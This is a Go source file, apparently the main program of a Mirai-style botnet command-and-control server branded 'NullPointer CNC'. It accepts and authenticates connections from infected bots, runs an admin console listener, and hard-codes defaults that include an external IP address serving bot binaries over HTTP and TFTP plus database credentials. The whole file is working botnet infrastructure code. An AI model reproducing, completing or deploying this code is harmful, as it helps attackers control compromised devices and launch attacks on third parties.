package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"time"
)

var clientList *ClientList = NewClientList()
var database *Database
var debugMode = os.Getenv("DEBUG") != ""

func main() {
	cfgPath := "config.json"
	if _, err := os.Stat(cfgPath); os.IsNotExist(err) {
		cfgPath = filepath.Join(filepath.Dir(os.Args[0]), "config.json")
	}
	c, err := loadConfig(cfgPath)
	if err != nil {
		fmt.Println("config load failed, using defaults:", err)
		c = &Config{
			CncListen:   "0.0.0.0:34129",
			AdminListen: "0.0.0.0:34131",
			ScanListen:  "0.0.0.0:34130",
			MysqlAddr:   "127.0.0.1:3306",
			MysqlUser:   "nullpointer",
			MysqlPass:   "nullpointer",
			MysqlTable:  "NullPointer",
			HttpServer:  "195.209.219.35",
			TftpServer:  "195.209.219.35",
			BinPrefix:   "nullpointer",
			BinPath:     "/var/www/html/bins",
		}
		cfg = c
	}
	database = NewDatabase(c.MysqlAddr, c.MysqlUser, c.MysqlPass, c.MysqlTable)
	protoInit(cfg.ProtoKey)

	go listenAdmin(c.AdminListen)
	tel, err := net.Listen("tcp", c.CncListen)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("[ NullPointer CNC ready ]")
	fmt.Println("  bots:  ", c.CncListen)
	fmt.Println("  admin: ", c.AdminListen)

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go botHandler(conn)
	}

	fmt.Println("ERROR: run ulimit -n 999999")
}

func listenAdmin(addr string) {
	tel, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("[admin] listen %s: %v", addr, err)
		return
	}
	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go func(c net.Conn) {
			if debugMode {
				log.Printf("[cnc] admin connect %s", c.RemoteAddr())
			}
			NewAdmin(c).Handle()
		}(conn)
	}
}

func botHandler(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	const minHandshake = 4 + 1
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil || n < minHandshake {
		if debugMode {
			log.Printf("[cnc] bot handshake read err from %s: %v", conn.RemoteAddr(), err)
		}
		return
	}

	if protoReady() {
		protoDecrypt(buf[:n])
	}

	if n < 4 {
		return
	}
	magic := binary.BigEndian.Uint16(buf[0:2])
	if magic != uint16(ProtoMagicBot) {
		if debugMode {
			log.Printf("[cnc] invalid magic 0x%04x from %s, drop", magic, conn.RemoteAddr())
		}
		return
	}

	ver := buf[2]
	idLen := buf[3]
	var source string
	if idLen > 0 && n >= 4+int(idLen) {
		source = string(buf[4 : 4+idLen])
	} else if idLen > 0 {
		rest := make([]byte, idLen)
		if readXBytes(conn, rest) != nil {
			return
		}
		if protoReady() {
			protoDecrypt(rest)
		}
		source = string(rest)
	}

	if debugMode {
		log.Printf("[cnc] bot connected %s ver=%d source=%s", conn.RemoteAddr(), ver, source)
	}
	NewBot(conn, ver, source).Handle()
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}
